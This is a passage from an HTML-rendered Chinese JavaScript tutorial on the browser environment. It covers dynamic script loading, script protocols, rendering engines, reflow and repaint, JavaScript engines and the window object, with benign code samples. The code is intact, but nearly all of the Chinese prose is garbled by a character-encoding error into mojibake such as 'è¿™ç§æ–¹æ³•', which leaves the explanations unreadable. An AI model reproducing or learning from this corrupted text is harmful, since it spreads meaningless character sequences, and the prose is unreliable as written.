</code></pre></div><p>è¿™ç§æ–¹æ³•çš„å¥½å¤„æ˜¯ï¼ŒåŠ¨æ€ç”Ÿæˆçš„<code>script</code>æ ‡ç­¾ä¸ä¼šé˜»å¡é¡µé¢æ¸²æŸ“ï¼Œä¹Ÿå°±ä¸ä¼šé€ æˆæµè§ˆå™¨å‡æ­»ã€‚ä½†æ˜¯é—®é¢˜åœ¨äºï¼Œè¿™ç§æ–¹æ³•æ— æ³•ä¿è¯è„šæœ¬çš„æ‰§è¡Œé¡ºåºï¼Œå“ªä¸ªè„šæœ¬æ–‡ä»¶å…ˆä¸‹è½½å®Œæˆï¼Œå°±å…ˆæ‰§è¡Œå“ªä¸ªã€‚</p><p>å¦‚æœæƒ³é¿å…è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥è®¾ç½®asyncå±æ€§ä¸º<code>false</code>ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token punctuation">[</span><span class="token string">&#39;a.js&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;b.js&#39;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">src</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&#39;script&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  script<span class="token punctuation">.</span>src <span class="token operator">=</span> src<span class="token punctuation">;</span>
  script<span class="token punctuation">.</span>async <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>ä¸Šé¢çš„ä»£ç ä¸ä¼šé˜»å¡é¡µé¢æ¸²æŸ“ï¼Œè€Œä¸”å¯ä»¥ä¿è¯<code>b.js</code>åœ¨<code>a.js</code>åé¢æ‰§è¡Œã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è¿™æ®µä»£ç åé¢åŠ è½½çš„è„šæœ¬æ–‡ä»¶ï¼Œä¼šå› æ­¤éƒ½ç­‰å¾…<code>b.js</code>æ‰§è¡Œå®Œæˆåå†æ‰§è¡Œã€‚</p><p>å¦‚æœæƒ³ä¸ºåŠ¨æ€åŠ è½½çš„è„šæœ¬æŒ‡å®šå›è°ƒå‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å†™æ³•ã€‚</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">loadScript</span><span class="token punctuation">(</span><span class="token parameter">src<span class="token punctuation">,</span> done</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> js <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&#39;script&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  js<span class="token punctuation">.</span>src <span class="token operator">=</span> src<span class="token punctuation">;</span>
  js<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  js<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">&#39;Failed to load script &#39;</span> <span class="token operator">+</span> src<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>js<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="åŠ è½½ä½¿ç”¨çš„åè®®" tabindex="-1"><a class="header-anchor" href="#åŠ è½½ä½¿ç”¨çš„åè®®" aria-hidden="true">#</a> åŠ è½½ä½¿ç”¨çš„åè®®</h4><p>å¦‚æœä¸æŒ‡å®šåè®®ï¼Œæµè§ˆå™¨é»˜è®¤é‡‡ç”¨ HTTP åè®®ä¸‹è½½ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>example.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>ä¸Šé¢çš„<code>example.js</code>é»˜è®¤å°±æ˜¯é‡‡ç”¨ HTTP åè®®ä¸‹è½½ï¼Œå¦‚æœè¦é‡‡ç”¨ HTTPS åè®®ä¸‹è½½ï¼Œå¿…éœ€å†™æ˜ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://example.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>ä½†æ˜¯æœ‰æ—¶æˆ‘ä»¬ä¼šå¸Œæœ›ï¼Œæ ¹æ®é¡µé¢æœ¬èº«çš„åè®®æ¥å†³å®šåŠ è½½åè®®ï¼Œè¿™æ—¶å¯ä»¥é‡‡ç”¨ä¸‹é¢çš„å†™æ³•ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>//example.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h3 id="æµè§ˆå™¨çš„ç»„æˆ" tabindex="-1"><a class="header-anchor" href="#æµè§ˆå™¨çš„ç»„æˆ" aria-hidden="true">#</a> æµè§ˆå™¨çš„ç»„æˆ</h3><p>æµè§ˆå™¨çš„æ ¸å¿ƒæ˜¯ä¸¤éƒ¨åˆ†ï¼šæ¸²æŸ“å¼•æ“å’Œ JavaScript è§£é‡Šå™¨ï¼ˆåˆç§° JavaScript å¼•æ“ï¼‰ã€‚</p><h4 id="æ¸²æŸ“å¼•æ“" tabindex="-1"><a class="header-anchor" href="#æ¸²æŸ“å¼•æ“" aria-hidden="true">#</a> æ¸²æŸ“å¼•æ“</h4><p>æ¸²æŸ“å¼•æ“çš„ä¸»è¦ä½œç”¨æ˜¯ï¼Œå°†ç½‘é¡µä»£ç æ¸²æŸ“ä¸ºç”¨æˆ·è§†è§‰å¯ä»¥æ„ŸçŸ¥çš„å¹³é¢æ–‡æ¡£ã€‚</p><p>ä¸åŒçš„æµè§ˆå™¨æœ‰ä¸åŒçš„æ¸²æŸ“å¼•æ“ã€‚</p><ul><li>Firefoxï¼šGecko å¼•æ“</li><li>Safariï¼šWebKit å¼•æ“</li><li>Chromeï¼šBlink å¼•æ“</li><li>IE: Trident å¼•æ“</li><li>Edge: EdgeHTML å¼•æ“</li></ul><p>æ¸²æŸ“å¼•æ“å¤„ç†ç½‘é¡µï¼Œé€šå¸¸åˆ†æˆå››ä¸ªé˜¶æ®µã€‚</p><ol><li>è§£æä»£ç ï¼šHTML ä»£ç è§£æä¸º DOMï¼ŒCSS ä»£ç è§£æä¸º CSSOMï¼ˆCSS Object Modelï¼‰ã€‚</li><li>å¯¹è±¡åˆæˆï¼šå°† DOM å’Œ CSSOM åˆæˆä¸€æ£µæ¸²æŸ“æ ‘ï¼ˆrender treeï¼‰ã€‚</li><li>å¸ƒå±€ï¼šè®¡ç®—å‡ºæ¸²æŸ“æ ‘çš„å¸ƒå±€ï¼ˆlayoutï¼‰ã€‚</li><li>ç»˜åˆ¶ï¼šå°†æ¸²æŸ“æ ‘ç»˜åˆ¶åˆ°å±å¹•ã€‚</li></ol><p>ä»¥ä¸Šå››æ­¥å¹¶éä¸¥æ ¼æŒ‰é¡ºåºæ‰§è¡Œï¼Œå¾€å¾€ç¬¬ä¸€æ­¥è¿˜æ²¡å®Œæˆï¼Œç¬¬äºŒæ­¥å’Œç¬¬ä¸‰æ­¥å°±å·²ç»å¼€å§‹äº†ã€‚æ‰€ä»¥ï¼Œä¼šçœ‹åˆ°è¿™ç§æƒ…å†µï¼šç½‘é¡µçš„ HTML ä»£ç è¿˜æ²¡ä¸‹è½½å®Œï¼Œä½†æµè§ˆå™¨å·²ç»æ˜¾ç¤ºå‡ºå†…å®¹äº†ã€‚</p><h4 id="é‡æµå’Œé‡ç»˜" tabindex="-1"><a class="header-anchor" href="#é‡æµå’Œé‡ç»˜" aria-hidden="true">#</a> é‡æµå’Œé‡ç»˜</h4><p>æ¸²æŸ“æ ‘è½¬æ¢ä¸ºç½‘é¡µå¸ƒå±€ï¼Œç§°ä¸ºâ€œå¸ƒå±€æµâ€ï¼ˆflowï¼‰ï¼›å¸ƒå±€æ˜¾ç¤ºåˆ°é¡µé¢çš„è¿™ä¸ªè¿‡ç¨‹ï¼Œç§°ä¸ºâ€œç»˜åˆ¶â€ï¼ˆpaintï¼‰ã€‚å®ƒä»¬éƒ½å…·æœ‰é˜»å¡æ•ˆåº”ï¼Œå¹¶ä¸”ä¼šè€—è´¹å¾ˆå¤šæ—¶é—´å’Œè®¡ç®—èµ„æºã€‚</p><p>é¡µé¢ç”Ÿæˆä»¥åï¼Œè„šæœ¬æ“ä½œå’Œæ ·å¼è¡¨æ“ä½œï¼Œéƒ½ä¼šè§¦å‘â€œé‡æµâ€ï¼ˆreflowï¼‰å’Œâ€œé‡ç»˜â€ï¼ˆrepaintï¼‰ã€‚ç”¨æˆ·çš„äº’åŠ¨ä¹Ÿä¼šè§¦å‘é‡æµå’Œé‡ç»˜ï¼Œæ¯”å¦‚è®¾ç½®äº†é¼ æ ‡æ‚¬åœï¼ˆ<code>a:hover</code>ï¼‰æ•ˆæœã€é¡µé¢æ»šåŠ¨ã€åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥æ–‡æœ¬ã€æ”¹å˜çª—å£å¤§å°ç­‰ç­‰ã€‚</p><p>é‡æµå’Œé‡ç»˜å¹¶ä¸ä¸€å®šä¸€èµ·å‘ç”Ÿï¼Œé‡æµå¿…ç„¶å¯¼è‡´é‡ç»˜ï¼Œé‡ç»˜ä¸ä¸€å®šéœ€è¦é‡æµã€‚æ¯”å¦‚æ”¹å˜å…ƒç´ é¢œè‰²ï¼Œåªä¼šå¯¼è‡´é‡ç»˜ï¼Œè€Œä¸ä¼šå¯¼è‡´é‡æµï¼›æ”¹å˜å…ƒç´ çš„å¸ƒå±€ï¼Œåˆ™ä¼šå¯¼è‡´é‡ç»˜å’Œé‡æµã€‚</p><p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨ä¼šæ™ºèƒ½åˆ¤æ–­ï¼Œå°†é‡æµå’Œé‡ç»˜åªé™åˆ¶åˆ°ç›¸å…³çš„å­æ ‘ä¸Šé¢ï¼Œæœ€å°åŒ–æ‰€è€—è´¹çš„ä»£ä»·ï¼Œè€Œä¸ä¼šå…¨å±€é‡æ–°ç”Ÿæˆç½‘é¡µã€‚</p><p>ä½œä¸ºå¼€å‘è€…ï¼Œåº”è¯¥å°½é‡è®¾æ³•é™ä½é‡ç»˜çš„æ¬¡æ•°å’Œæˆæœ¬ã€‚æ¯”å¦‚ï¼Œå°½é‡ä¸è¦å˜åŠ¨é«˜å±‚çš„ DOM å…ƒç´ ï¼Œè€Œä»¥åº•å±‚ DOM å…ƒç´ çš„å˜åŠ¨ä»£æ›¿ï¼›å†æ¯”å¦‚ï¼Œé‡ç»˜<code>table</code>å¸ƒå±€å’Œ<code>flex</code>å¸ƒå±€ï¼Œå¼€é”€éƒ½ä¼šæ¯”è¾ƒå¤§ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> foo <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&#39;foobar&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

foo<span class="token punctuation">.</span>style<span class="token punctuation">.</span>color <span class="token operator">=</span> <span class="token string">&#39;blue&#39;</span><span class="token punctuation">;</span>
foo<span class="token punctuation">.</span>style<span class="token punctuation">.</span>marginTop <span class="token operator">=</span> <span class="token string">&#39;30px&#39;</span><span class="token punctuation">;</span>
</code></pre></div><p>ä¸Šé¢çš„ä»£ç åªä¼šå¯¼è‡´ä¸€æ¬¡é‡ç»˜ï¼Œå› ä¸ºæµè§ˆå™¨ä¼šç´¯ç§¯ DOM å˜åŠ¨ï¼Œç„¶åä¸€æ¬¡æ€§æ‰§è¡Œã€‚</p><p>ä¸‹é¢æ˜¯ä¸€äº›ä¼˜åŒ–æŠ€å·§ï¼š</p><ul><li>è¯»å– DOM æˆ–è€…å†™å…¥ DOMï¼Œå°½é‡å†™åœ¨ä¸€èµ·ï¼Œä¸è¦æ··æ‚ã€‚ä¸è¦è¯»å–ä¸€ä¸ª DOM èŠ‚ç‚¹ï¼Œç„¶åç«‹åˆ»å†™å…¥ï¼Œæ¥ç€å†è¯»å–ä¸€ä¸ª DOM èŠ‚ç‚¹ã€‚</li><li>ç¼“å­˜ DOM ä¿¡æ¯ã€‚</li><li>ä¸è¦ä¸€é¡¹ä¸€é¡¹åœ°æ”¹å˜æ ·å¼ï¼Œè€Œæ˜¯ä½¿ç”¨ CSS class ä¸€æ¬¡æ€§æ”¹å˜æ ·å¼ã€‚</li><li>ä½¿ç”¨<code>documentFragment</code>æ“ä½œ DOM</li><li>åŠ¨ç”»ä½¿ç”¨<code>absolute</code>å®šä½æˆ–<code>fixed</code>å®šä½ï¼Œè¿™æ ·å¯ä»¥å‡å°‘å¯¹å…¶ä»–å…ƒç´ çš„å½±å“ã€‚</li><li>åªåœ¨å¿…è¦æ—¶æ‰æ˜¾ç¤ºéšè—å…ƒç´ ã€‚</li><li>ä½¿ç”¨<code>window.requestAnimationFrame()</code>ï¼Œå› ä¸ºå®ƒå¯ä»¥æŠŠä»£ç æ¨è¿Ÿåˆ°ä¸‹ä¸€æ¬¡é‡ç»˜ä¹‹å‰æ‰§è¡Œï¼Œè€Œä¸æ˜¯ç«‹å³è¦æ±‚é¡µé¢é‡ç»˜ã€‚</li><li>ä½¿ç”¨è™šæ‹Ÿ DOMï¼ˆvirtual DOMï¼‰åº“ã€‚</li></ul><p>ä¸‹é¢æ˜¯ä¸€ä¸ª<code>window.requestAnimationFrame()</code>å¯¹æ¯”æ•ˆæœçš„ä¾‹å­ã€‚</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token comment">// é‡æµä»£ä»·é«˜</span>
<span class="token keyword">function</span> <span class="token function">doubleHeight</span><span class="token punctuation">(</span><span class="token parameter">element</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> currentHeight <span class="token operator">=</span> element<span class="token punctuation">.</span>clientHeight<span class="token punctuation">;</span>
  element<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token punctuation">(</span>currentHeight <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&#39;px&#39;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

all_my_elements<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>doubleHeight<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// é‡ç»˜ä»£ä»·ä½</span>
<span class="token keyword">function</span> <span class="token function">doubleHeight</span><span class="token punctuation">(</span><span class="token parameter">element</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> currentHeight <span class="token operator">=</span> element<span class="token punctuation">.</span>clientHeight<span class="token punctuation">;</span>

  window<span class="token punctuation">.</span><span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    element<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token punctuation">(</span>currentHeight <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&#39;px&#39;</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

all_my_elements<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>doubleHeight<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>ä¸Šé¢çš„ç¬¬ä¸€æ®µä»£ç ï¼Œæ¯è¯»ä¸€æ¬¡ DOMï¼Œå°±å†™å…¥æ–°çš„å€¼ï¼Œä¼šé€ æˆä¸åœçš„é‡æ’å’Œé‡æµã€‚ç¬¬äºŒæ®µä»£ç æŠŠæ‰€æœ‰çš„å†™æ“ä½œï¼Œéƒ½ç´¯ç§¯åœ¨ä¸€èµ·ï¼Œä»è€Œ DOM ä»£ç å˜åŠ¨çš„ä»£ä»·å°±æœ€å°åŒ–äº†ã€‚</p><h4 id="javascript-å¼•æ“" tabindex="-1"><a class="header-anchor" href="#javascript-å¼•æ“" aria-hidden="true">#</a> JavaScript å¼•æ“</h4><p>JavaScript å¼•æ“çš„ä¸»è¦ä½œç”¨æ˜¯ï¼Œè¯»å–ç½‘é¡µä¸­çš„ JavaScript ä»£ç ï¼Œå¯¹å…¶å¤„ç†åè¿è¡Œã€‚</p><p>JavaScript æ˜¯ä¸€ç§è§£é‡Šå‹è¯­è¨€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒä¸éœ€è¦ç¼–è¯‘ï¼Œç”±è§£é‡Šå™¨å®æ—¶è¿è¡Œã€‚è¿™æ ·çš„å¥½å¤„æ˜¯è¿è¡Œå’Œä¿®æ”¹éƒ½æ¯”è¾ƒæ–¹ä¾¿ï¼Œåˆ·æ–°é¡µé¢å°±å¯ä»¥é‡æ–°è§£é‡Šï¼›ç¼ºç‚¹æ˜¯æ¯æ¬¡è¿è¡Œéƒ½è¦è°ƒç”¨è§£é‡Šå™¨ï¼Œç³»ç»Ÿå¼€é”€è¾ƒå¤§ï¼Œè¿è¡Œé€Ÿåº¦æ…¢äºç¼–è¯‘å‹è¯­è¨€ã€‚</p><p>ä¸ºäº†æé«˜è¿è¡Œé€Ÿåº¦ï¼Œç›®å‰çš„æµè§ˆå™¨éƒ½å°† JavaScript è¿›è¡Œä¸€å®šç¨‹åº¦çš„ç¼–è¯‘ï¼Œç”Ÿæˆç±»ä¼¼å­—èŠ‚ç ï¼ˆbytecodeï¼‰çš„ä¸­é—´ä»£ç ï¼Œä»¥æé«˜è¿è¡Œé€Ÿåº¦ã€‚</p><p>æ—©æœŸï¼Œæµè§ˆå™¨å†…éƒ¨å¯¹ JavaScript çš„å¤„ç†è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li>è¯»å–ä»£ç ï¼Œè¿›è¡Œè¯æ³•åˆ†æï¼ˆLexical analysisï¼‰ï¼Œå°†ä»£ç åˆ†è§£æˆè¯å…ƒï¼ˆtokenï¼‰ã€‚</li><li>å¯¹è¯å…ƒè¿›è¡Œè¯­æ³•åˆ†æï¼ˆparsingï¼‰ï¼Œå°†ä»£ç æ•´ç†æˆâ€œè¯­æ³•æ ‘â€ï¼ˆsyntax treeï¼‰ã€‚</li><li>ä½¿ç”¨â€œç¿»è¯‘å™¨â€ï¼ˆtranslatorï¼‰ï¼Œå°†ä»£ç è½¬ä¸ºå­—èŠ‚ç ï¼ˆbytecodeï¼‰ã€‚</li><li>ä½¿ç”¨â€œå­—èŠ‚ç è§£é‡Šå™¨â€ï¼ˆbytecode interpreterï¼‰ï¼Œå°†å­—èŠ‚ç è½¬ä¸ºæœºå™¨ç ã€‚</li></ol><p>é€è¡Œè§£é‡Šå°†å­—èŠ‚ç è½¬ä¸ºæœºå™¨ç ï¼Œæ˜¯å¾ˆä½æ•ˆçš„ã€‚ä¸ºäº†æé«˜è¿è¡Œé€Ÿåº¦ï¼Œç°ä»£æµè§ˆå™¨æ”¹ä¸ºé‡‡ç”¨â€œå³æ—¶ç¼–è¯‘â€ï¼ˆJust In Time compilerï¼Œç¼©å†™ JITï¼‰ï¼Œå³å­—èŠ‚ç åªåœ¨è¿è¡Œæ—¶ç¼–è¯‘ï¼Œç”¨åˆ°å“ªä¸€è¡Œå°±ç¼–è¯‘å“ªä¸€è¡Œï¼Œå¹¶ä¸”æŠŠç¼–è¯‘ç»“æœç¼“å­˜ï¼ˆinline cacheï¼‰ã€‚é€šå¸¸ï¼Œä¸€ä¸ªç¨‹åºè¢«ç»å¸¸ç”¨åˆ°çš„ï¼Œåªæ˜¯å…¶ä¸­ä¸€å°éƒ¨åˆ†ä»£ç ï¼Œæœ‰äº†ç¼“å­˜çš„ç¼–è¯‘ç»“æœï¼Œæ•´ä¸ªç¨‹åºçš„è¿è¡Œé€Ÿåº¦å°±ä¼šæ˜¾è‘—æå‡ã€‚</p><p>å­—èŠ‚ç ä¸èƒ½ç›´æ¥è¿è¡Œï¼Œè€Œæ˜¯è¿è¡Œåœ¨ä¸€ä¸ªè™šæ‹Ÿæœºï¼ˆVirtual Machineï¼‰ä¹‹ä¸Šï¼Œä¸€èˆ¬ä¹ŸæŠŠè™šæ‹Ÿæœºç§°ä¸º JavaScript å¼•æ“ã€‚å¹¶éæ‰€æœ‰çš„ JavaScript è™šæ‹Ÿæœºè¿è¡Œæ—¶éƒ½æœ‰å­—èŠ‚ç ï¼Œæœ‰çš„ JavaScript è™šæ‹ŸæœºåŸºäºæºç ï¼Œå³åªè¦æœ‰å¯èƒ½ï¼Œå°±é€šè¿‡ JITï¼ˆjust in timeï¼‰ç¼–è¯‘å™¨ç›´æ¥æŠŠæºç ç¼–è¯‘æˆæœºå™¨ç è¿è¡Œï¼Œçœç•¥å­—èŠ‚ç æ­¥éª¤ã€‚è¿™ä¸€ç‚¹ä¸å…¶ä»–é‡‡ç”¨è™šæ‹Ÿæœºï¼ˆæ¯”å¦‚ Javaï¼‰çš„è¯­è¨€ä¸å°½ç›¸åŒã€‚è¿™æ ·åšçš„ç›®çš„ï¼Œæ˜¯ä¸ºäº†å°½å¯èƒ½åœ°ä¼˜åŒ–ä»£ç ã€æé«˜æ€§èƒ½ã€‚ä¸‹é¢æ˜¯ç›®å‰æœ€å¸¸è§çš„ä¸€äº› JavaScript è™šæ‹Ÿæœºï¼š</p><ul><li><a href="https://en.wikipedia.org/wiki/Chakra_(JScript_engine)" target="_blank" rel="noopener noreferrer">Chakra<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> (Microsoft Internet Explorer)</li><li><a href="https://en.wikipedia.org/wiki/WebKit#JavaScriptCore" target="_blank" rel="noopener noreferrer">Nitro/JavaScript Core<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> (Safari)</li><li><a href="https://dev.opera.com/articles/view/labs-carakan/" target="_blank" rel="noopener noreferrer">Carakan<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> (Opera)</li><li><a href="https://developer.mozilla.org/en-US/docs/SpiderMonkey" target="_blank" rel="noopener noreferrer">SpiderMonkey<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> (Firefox)</li><li><a href="https://en.wikipedia.org/wiki/Chrome_V8" target="_blank" rel="noopener noreferrer">V8<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> (Chrome, Chromium)</li></ul><h2 id="window-å¯¹è±¡" tabindex="-1"><a class="header-anchor" href="#window-å¯¹è±¡" aria-hidden="true">#</a> Window å¯¹è±¡</h2><h3 id="æ¦‚è¿°" tabindex="-1"><a class="header-anchor" href="#æ¦‚è¿°" aria-hidden="true">#</a> æ¦‚è¿°</h3><p>æµè§ˆå™¨é‡Œé¢ï¼Œ<code>window</code>å¯¹è±¡ï¼ˆæ³¨æ„ï¼Œ<code>w</code>ä¸ºå°å†™ï¼‰æŒ‡å½“å‰çš„æµè§ˆå™¨çª—å£ã€‚å®ƒä¹Ÿæ˜¯å½“å‰é¡µé¢çš„é¡¶å±‚å¯¹è±¡ï¼Œå³æœ€é«˜ä¸€å±‚çš„å¯¹è±¡ï¼Œæ‰€æœ‰å…¶ä»–å¯¹è±¡éƒ½æ˜¯å®ƒçš„ä¸‹å±ã€‚ä¸€ä¸ªå˜é‡å¦‚æœæœªå£°æ˜ï¼Œé‚£ä¹ˆé»˜è®¤å°±æ˜¯é¡¶å±‚å¯¹è±¡çš„å±æ€§ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span>a <span class="token comment">// 1</span>
